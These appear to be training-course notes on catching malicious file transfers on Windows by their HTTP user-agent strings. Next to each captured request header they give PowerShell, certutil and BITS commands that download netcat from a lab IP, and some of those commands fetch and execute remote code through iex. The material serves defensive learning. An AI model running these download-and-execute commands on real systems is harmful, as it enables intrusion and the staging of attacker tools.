Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. But process of whitelisting the command all command lines is difficult. Its robust and allow quick detection.

Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the `HTTP` protocol. 

User agent require anything acting as `HTTP` client and connecting to a web server via `HTTP` can have a user agent string (i.e., `cURL`, a custom `Python` script, or common tools such as `sqlmap`, or `Nmap`).

This [website](http://useragentstring.com/index.php) is handy for identifying common user agent strings. A list of user agent strings is available [here](http://useragentstring.com/pages/useragentstring.php).
Malicious file transfers can also be detected by their user agents.
#### Invoke-WebRequest - Client
 Sending Request Using `WebRequest` .
```powershell
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```
#### Invoke-WebRequest - Server
```shell
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```
#### WinHttpRequest - Client
 Sending Request Using `WindHttpsRequest` .
```powershell
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```
#### WinHttpRequest - Server
```shell
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```
#### Msxml2 - Client
```powershell
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```
#### Msxml2 - Server
 Sending Request Using `Msxml2` .
```shell
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```
#### Certutil - Client
 Sending Request Using `Certutil` .
```cmd
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```
#### Certutil - Server
```shell
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```
#### BITS - Client
 Sending Request Using `BITs` .
```powershell
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```
#### BITS - Server
```shell
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

It would be an excellent start for any organization to create a whitelist of allowed binaries or a blacklist of binaries known to be used for malicious purposes.